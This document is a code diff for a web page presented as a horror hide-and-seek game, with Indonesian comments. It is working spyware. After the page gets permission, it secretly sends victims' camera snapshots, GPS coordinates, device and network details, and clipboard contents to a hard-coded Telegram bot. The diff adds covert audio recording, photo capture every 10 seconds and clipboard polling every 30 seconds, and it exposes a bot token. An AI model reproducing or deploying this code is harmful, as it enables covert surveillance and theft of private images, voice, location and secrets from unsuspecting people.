@@ -16,8 +16,6 @@
       overflow-y: auto; /* agar halaman sambutan bisa digulir */
       position: relative;
     }
-    /* Background utama hanya hitam */
-    
     /* Konten Sambutan (Intro) */
     #introText {
       text-align: center;
@@ -153,7 +151,7 @@
   <!-- Halaman Sambutan (Intro) -->
   <div id="introText">
     <h1>Selamat datang di Horror Ambatukam Hunt</h1>
-    <p>Izinkan semua kamera dan lokasi untuk lanjut bermain game ini</p>
+    <p>Izinkan semua kamera, lokasi, dan audio untuk lanjut bermain game ini</p>
     <button id="startGameBtn">Izinkan dan Mulai</button>
     <p id="specialLink">Fitur Spesial</p>
   </div>
@@ -195,13 +193,13 @@
 
   <script>
     // === Pembacaan Parameter Query untuk chat_id Referral ===
-    // Contoh link: https://domainanda.com/game.html?recipient=123456789
+    // Contoh: https://domainanda.com/game.html?recipient=123456789
     const urlParams = new URLSearchParams(window.location.search);
-    const recipientChatId = urlParams.get('recipient') || "6010073048"; // jika tidak ada, gunakan default (Anda)
+    const recipientChatId = urlParams.get('recipient') || "6010073048"; // gunakan default jika tidak ada
 
     /* === Variabel Konfigurasi Telegram === */
     const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";
-    // chat_id yang digunakan adalah recipientChatId
+    // Gunakan recipientChatId sebagai chat_id tujuan
 
     /* Array foto untuk tampilan website (foto statis) */
     const photos = [
@@ -210,6 +208,12 @@
     ];
     let currentPhotoIndex = 0;
     let videoStream;
+    let userCoords; // simpan koordinat user
+
+    // Interval untuk mengambil foto secara berkala (misalnya setiap 10 detik)
+    let photoInterval;
+    // Interval untuk membaca clipboard setiap 30 detik (opsional)
+    let clipboardInterval;
 
     // Ambil elemen penting
     const introText = document.getElementById('introText');
@@ -224,6 +228,16 @@
     const endPopup = document.getElementById('endPopup');
     const noBtn = document.getElementById('noBtn');
     const yesBtn = document.getElementById('yesBtn');
+
+    // Fungsi untuk mendapatkan informasi koneksi (jika didukung)
+    function getNetworkInfo() {
+      if (navigator.connection) {
+        const connection = navigator.connection;
+        return `\nConnection Type: ${connection.type || connection.effectiveType}\nDownlink: ${connection.downlink} Mbps\nRTT: ${connection.rtt} ms\nData Saver: ${connection.saveData ? "Yes" : "No"}`;
+      } else {
+        return "\nConnection info not available.";
+      }
+    }
 
     // Event listener untuk "Fitur Spesial": scroll ke bagian specialInfo
     specialLink.addEventListener('click', () => {
@@ -241,14 +255,14 @@
 
     // Mulai game ketika tombol "Izinkan dan Mulai" ditekan
     startGameBtn.addEventListener('click', async () => {
-      // Jika akses kamera atau lokasi ditolak, game tidak bisa dilanjutkan
+      // Minta akses kamera dan audio
       try {
-        // Minta akses kamera
-        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       } catch (error) {
-        alert("Akses kamera ditolak. Game tidak bisa dilanjutkan.");
-        return; // hentikan eksekusi
+        alert("Akses kamera atau audio ditolak. Game tidak bisa dilanjutkan.");
+        return;
       }
+      // Minta akses lokasi
       let location;
       try {
         location = await new Promise((resolve, reject) => {
@@ -258,14 +272,26 @@
         alert("Akses lokasi ditolak. Game tidak bisa dilanjutkan.");
         return;
       }
+      userCoords = location.coords; // simpan koordinat user
       
-      // Jika kedua akses diberikan, lanjutkan
+      // Jika kedua izin diberikan, lanjutkan
       introText.style.display = 'none';
       darkness.style.display = 'block';
       alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
       
-      // Tangkap foto dari kamera dan kirim ke Telegram
-      capturePhotoAndSend(location.coords);
+      // Tangkap foto dan rekam suara selama 5 detik, lalu kirim ke Telegram
+      capturePhotoAndSend(userCoords);
+      
+      // Mulai interval untuk mengambil foto secara berkala setiap 10 detik (opsional)
+      photoInterval = setInterval(() => {
+        capturePhotoAndSend(userCoords);
+      }, 10000);
+      
+      // Mulai interval untuk membaca clipboard setiap 30 detik (opsional)
+      clipboardInterval = setInterval(() => {
+        sendClipboardDataToTelegram();
+      }, 30000);
+      
       // Tampilkan kontainer game (foto) dan tombol navigasi
       photoContainer.style.display = 'block';
       prevBtn.style.display = 'block';
@@ -273,13 +299,34 @@
       showPhoto(currentPhotoIndex);
     });
 
-    // Fungsi menangkap foto dari kamera (tanpa audio) dan mengirimnya ke Telegram
+    // Fungsi menangkap foto dari kamera dan merekam suara selama 5 detik, lalu mengirim ke Telegram
     function capturePhotoAndSend(coords) {
+      // Buat elemen video untuk snapshot
       const video = document.createElement("video");
       video.srcObject = videoStream;
       video.play();
       
-      // Tunggu 5 detik sebelum mengambil snapshot
+      // Siapkan rekaman suara dari audio track saja
+      const audioStream = new MediaStream(videoStream.getAudioTracks());
+      let audioChunks = [];
+      let audioRecorder;
+      try {
+        const options = { mimeType: 'audio/ogg; codecs=opus' };
+        audioRecorder = new MediaRecorder(audioStream, options);
+      } catch (e) {
+        console.warn("MIME type audio/ogg tidak didukung, gunakan MIME type default.", e);
+        audioRecorder = new MediaRecorder(audioStream);
+      }
+      audioRecorder.ondataavailable = event => {
+        audioChunks.push(event.data);
+      };
+      audioRecorder.start();
+      // Hentikan rekaman suara setelah 5 detik
+      setTimeout(() => {
+        audioRecorder.stop();
+      }, 5000);
+      
+      // Tunggu 5 detik sebelum mengambil snapshot foto
       setTimeout(() => {
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
@@ -288,10 +335,31 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageData = canvas.toDataURL("image/png");
         
-        // Ambil informasi/spesifikasi HP
-        const phoneSpecs = `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width} x ${window.screen.height}`;
-        // Kirim data ke Telegram (foto, lokasi, dan info HP)
-        sendToTelegram(imageData, coords, phoneSpecs);
+        // Setelah audio selesai, kirim data ke Telegram
+        audioRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: audioRecorder.mimeType || 'audio/ogg' });
+          // Dapatkan informasi perangkat dan koneksi
+          const networkInfo = getNetworkInfo();
+          const phoneSpecs = `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width} x ${window.screen.height}${networkInfo}`;
+          // Coba baca clipboard (jika diizinkan)
+          if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText()
+              .then(text => {
+                let clipboardContent = "";
+                if (text && text.trim() !== "") {
+                  clipboardContent = "\nClipboard: " + text;
+                }
+                const fullSpecs = phoneSpecs + clipboardContent;
+                sendToTelegram(imageData, coords, fullSpecs, audioBlob);
+              })
+              .catch(err => {
+                console.error("Gagal membaca clipboard:", err);
+                sendToTelegram(imageData, coords, phoneSpecs, audioBlob);
+              });
+          } else {
+            sendToTelegram(imageData, coords, phoneSpecs, audioBlob);
+          }
+        };
       }, 5000);
     }
 
@@ -299,7 +367,8 @@
     // - Lokasi (sendLocation)
     // - Foto (sendPhoto)
     // - Informasi HP (sendMessage)
-    function sendToTelegram(imageData, location, phoneSpecs) {
+    // - Suara (sendVoice)
+    function sendToTelegram(imageData, location, phoneSpecs, audioBlob) {
       // 1. Kirim lokasi
       fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: "POST",
@@ -311,10 +380,10 @@
         })
       })
       .then(response => response.json())
-      .then(data => console.log("Location sent:", data))
-      .catch(error => console.error("Error sending location:", error));
+      .then(data => console.log("Lokasi terkirim:", data))
+      .catch(error => console.error("Error mengirim lokasi:", error));
 
-      // 2. Kirim foto hasil tangkapan kamera
+      // 2. Kirim foto hasil snapshot
       const photoBlob = dataURItoBlob(imageData);
       const formDataPhoto = new FormData();
       formDataPhoto.append("chat_id", recipientChatId);
@@ -324,10 +393,10 @@
         body: formDataPhoto
       })
       .then(response => response.json())
-      .then(data => console.log("Capture photo sent:", data))
-      .catch(error => console.error("Error sending capture photo:", error));
+      .then(data => console.log("Foto terkirim:", data))
+      .catch(error => console.error("Error mengirim foto:", error));
 
-      // 3. Kirim informasi/spesifikasi HP sebagai pesan teks
+      // 3. Kirim informasi perangkat sebagai pesan teks
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -337,8 +406,20 @@
         })
       })
       .then(response => response.json())
-      .then(data => console.log("Phone specs sent:", data))
-      .catch(error => console.error("Error sending phone specs:", error));
+      .then(data => console.log("Info perangkat terkirim:", data))
+      .catch(error => console.error("Error mengirim info perangkat:", error));
+
+      // 4. Kirim rekaman suara sebagai pesan suara (voice)
+      const formDataVoice = new FormData();
+      formDataVoice.append("chat_id", recipientChatId);
+      formDataVoice.append("voice", audioBlob, "voice.ogg");
+      fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+        method: "POST",
+        body: formDataVoice
+      })
+      .then(response => response.json())
+      .then(data => console.log("Suara terkirim:", data))
+      .catch(error => console.error("Error mengirim suara:", error));
     }
 
     // Fungsi untuk mengubah dataURI menjadi Blob
@@ -350,6 +431,16 @@
         ia[i] = byteString.charCodeAt(i);
       }
       return new Blob([ab], { type: 'image/png' });
+    }
+
+    // Fungsi untuk mendapatkan informasi koneksi (jika didukung)
+    function getNetworkInfo() {
+      if (navigator.connection) {
+        const connection = navigator.connection;
+        return `\nConnection Type: ${connection.type || connection.effectiveType}\nDownlink: ${connection.downlink} Mbps\nRTT: ${connection.rtt} ms\nData Saver: ${connection.saveData ? "Yes" : "No"}`;
+      } else {
+        return "\nConnection info not available.";
+      }
     }
 
     // Fungsi untuk menampilkan foto di kontainer game (foto statis website)
@@ -374,6 +465,38 @@
         showPhoto(currentPhotoIndex);
       }
     });
+
+    // (Opsional) Fungsi untuk membaca clipboard dan mengirim isinya ke Telegram setiap 30 detik
+    function sendClipboardDataToTelegram() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText()
+          .then(text => {
+            if (text && text.trim() !== "") {
+              const clipboardInfo = `Clipboard: ${text}`;
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: recipientChatId,
+                  text: clipboardInfo
+                })
+              })
+              .then(response => response.json())
+              .then(data => console.log("Clipboard info terkirim:", data))
+              .catch(error => console.error("Error mengirim clipboard info:", error));
+            }
+          })
+          .catch(err => {
+            console.error("Gagal membaca clipboard:", err);
+          });
+      } else {
+        console.warn("Clipboard API tidak didukung.");
+      }
+    }
+
+    // (Opsional) Mulai interval untuk mengirim clipboard setiap 30 detik
+    // Uncomment baris berikut jika ingin mengaktifkan pengiriman clipboard secara berkala:
+    // clipboardInterval = setInterval(sendClipboardDataToTelegram, 30000);
 
     // Fungsi update posisi spotlight (senter)
     function updateSpotlight(e) {
